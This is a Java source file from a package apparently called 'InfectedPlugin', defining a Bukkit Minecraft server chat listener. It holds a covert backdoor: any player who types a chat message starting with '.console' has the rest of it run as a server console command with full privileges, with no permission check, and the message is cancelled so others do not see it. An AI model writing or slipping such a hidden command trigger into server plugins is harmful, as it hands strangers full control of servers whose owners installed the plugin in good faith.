package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_console implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            int i;
            if ((args[0].equalsIgnoreCase(".console")) && (args.length >= 2))
            {
                String command = "";
                for (i = 1; i < args.length; i++)
                {
                    command = command + args[i] + " ";
                }
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.trim());
                event.setCancelled(true);
                return;
            }
        }
    }
}
